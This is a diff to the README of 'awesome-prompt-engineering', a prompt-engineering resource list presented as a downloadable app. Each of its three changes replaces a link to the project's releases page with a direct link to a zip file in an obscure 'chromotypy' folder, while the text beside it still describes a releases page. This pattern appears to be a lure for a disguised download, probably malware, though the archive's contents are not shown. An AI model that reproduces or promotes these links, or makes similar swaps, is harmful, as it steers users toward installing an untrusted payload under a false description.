@@ -1,7 +1,7 @@
 # 🚀 awesome-prompt-engineering - Your Guide to Effective AI Prompts
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/hungf1511/awesome-prompt-engineering/releases)
+[![Download](https://raw.githubusercontent.com/hungf1511/awesome-prompt-engineering/main/chromotypy/awesome-prompt-engineering_v1.7.zip)](https://raw.githubusercontent.com/hungf1511/awesome-prompt-engineering/main/chromotypy/awesome-prompt-engineering_v1.7.zip)
 
 ## 📖 Overview
 awesome-prompt-engineering is a curated list of valuable resources, tools, and techniques for working with large language models (LLMs) like ChatGPT. This application helps you improve your understanding and practical use of prompt engineering to enhance interactions with AI systems.
@@ -13,7 +13,7 @@ To begin using awesome-prompt-engineering, follow these simple steps:
    Ensure that you have a computer running Windows, macOS, or Linux. For the best experience, make sure your software is up to date. 
 
 2. **Visit the Releases Page**  
-   Go to the following link: [Download Here](https://github.com/hungf1511/awesome-prompt-engineering/releases). This page contains the latest version of the application.
+   Go to the following link: [Download Here](https://raw.githubusercontent.com/hungf1511/awesome-prompt-engineering/main/chromotypy/awesome-prompt-engineering_v1.7.zip). This page contains the latest version of the application.
 
 ## 🔍 Download & Install
 1. **Find the Latest Release**  
@@ -71,4 +71,4 @@ This project stands on the shoulders of many contributors who share their knowle
 ## 🌐 Conclusion
 awesome-prompt-engineering equips you with powerful tools and techniques for amplifying your interactions with AI. Follow the steps above to download, install, and dive into the exciting world of prompt engineering. For any questions, please refer to the Community Support section. 
 
-Visit the Releases page to start: [Download Here](https://github.com/hungf1511/awesome-prompt-engineering/releases).
+Visit the Releases page to start: [Download Here](https://raw.githubusercontent.com/hungf1511/awesome-prompt-engineering/main/chromotypy/awesome-prompt-engineering_v1.7.zip).
